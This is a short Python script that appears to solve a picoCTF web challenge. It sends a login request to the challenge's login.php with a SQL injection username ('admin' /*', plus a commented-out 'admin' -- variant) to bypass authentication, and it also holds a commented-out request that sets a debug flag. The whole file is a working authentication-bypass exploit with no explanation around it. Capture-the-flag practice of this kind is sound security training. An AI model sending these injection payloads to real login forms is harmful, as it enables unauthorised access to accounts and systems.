import requests

s = requests.Session()

url = 'https://jupiter.challenges.picoctf.org/problem/50009/login.php'


# setDebugFlagPayload = {
#     'username' : 'test',
#     'password' : 'test',
#     'debug' : '1'
# }

# resp = s.post(url, data=setDebugFlagPayload)
# print(resp.text)

exploit = {
    'username' : """admin' /*""",
    # 'username' : """admin' --""""
    'password' : 'Does not matter'
}

resp = s.post(url, data=exploit)
print(resp.text)
